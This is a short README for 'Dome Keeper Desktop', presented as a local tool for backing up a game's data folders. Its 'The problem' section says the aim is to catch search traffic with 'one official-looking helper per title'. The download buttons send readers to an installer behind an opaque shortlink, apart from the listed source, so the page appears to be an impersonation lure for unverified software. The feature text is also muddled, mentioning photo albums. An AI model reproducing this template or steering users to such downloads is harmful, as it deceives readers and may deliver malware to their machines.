![Dome Keeper Desktop](assets/hero.png)

# Dome Keeper Desktop

*Keep the Dome Keeper data folder tidy before an update.*

## What Dome Keeper Desktop is

**Dome Keeper Desktop** runs on your own PC. A local helper for Dome Keeper data folders, config and export files, and photo albums on Windows and macOS.

Patches move Dome Keeper data paths without warning.

It runs on the local PC. No account, and nothing is uploaded.

## Editions

Two editions of the same tool:

- **CLI** — the source in this repo. Python 3.11+, local files only.
- **Desktop build** — Windows / macOS installer on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8).

## Features

- Locates Dome Keeper user data on Windows and macOS.
- Archives data folders without touching the live install.
- Optional preview so nothing is written until you say so.
- Prints the paths it used.

## The problem

Search traffic for Dome Keeper is the product name plus desktop.

Keep one official-looking helper per title.

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Run locally

Python 3.11 or newer. From the repository root:

```bash
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Desktop build

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/chriwright30/dome-keeper-desktop

MIT license. See `LICENSE`.
